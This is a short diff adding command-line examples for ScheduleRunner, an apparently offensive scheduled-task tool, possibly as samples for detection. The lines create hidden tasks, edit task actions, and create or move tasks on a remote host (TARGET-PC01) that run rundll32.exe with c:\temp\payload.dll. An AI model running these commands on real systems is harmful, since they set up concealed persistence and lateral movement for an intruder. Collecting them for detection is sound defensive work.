@@ -1,0 +1,17 @@
+"`ScheduleRunner.exe /method:create /taskname:Cleanup /trigger:daily /starttime:23:30 /program:calc.exe /description:""Some description"" /author:netero1010 /technique:hide"
+"`ScheduleRunner.exe /method:create /taskname:Cleanup /trigger:daily /starttime:23:30 /program:calc.exe /description:""Some description"" /author:netero1010"
+"`ScheduleRunner.exe /method:edit /taskname:test /program:calc.exe /argument:""-m 1"" /oldaction:""C:\Windows\notepad.exe"""
+"`ScheduleRunner.exe /method:edit /taskname:test /program:calc.exe /argument:""-m 1"" /order:1 /trigger:onlogon"
+"`ScheduleRunner.exe /method:edit /taskname:test /program:calc.exe /argument:""-m 1"" /order:1"
+"`ScheduleRunner.exe /method:edit /taskname:test /program:calc.exe /argument:""-m 1"""
+"`ScheduleRunner.exe /method:edit /taskname:test /program:calc.exe /oldaction:""C:\Windows\notepad.exe"""
+`ScheduleRunner.exe /method:create /taskname:Cleanup /trigger:hourly /modifier:4 /program:rundll32.exe /argument:c:\temp\payload.dll /remoteserver:TARGET-PC01
+`ScheduleRunner.exe /method:delete /taskname:Cleanup
+`ScheduleRunner.exe /method:delete /taskname:Cleanup /technique:hide
+`ScheduleRunner.exe /method:edit /taskname:test /program:calc.exe
+`ScheduleRunner.exe /method:edit /taskname:test /program:calc.exe /order:1
+`ScheduleRunner.exe /method:move /taskname:Demo /remoteserver:TARGET-PC01 /program:rundll32.exe /argument:c:\temp\payload.dll /user:netero1010
+`ScheduleRunner.exe /method:query /folder:\Microsoft\Windows\CertificateServicesClient /remoteserver:TARGET-PC01
+`ScheduleRunner.exe /method:query /taskname:Cleanup /folder:\Microsoft\Windows\CertificateServicesClient /remoteserver:TARGET-PC01
+`ScheduleRunner.exe /method:queryfolders
+`ScheduleRunner.exe /method:run /taskname:Cleanup
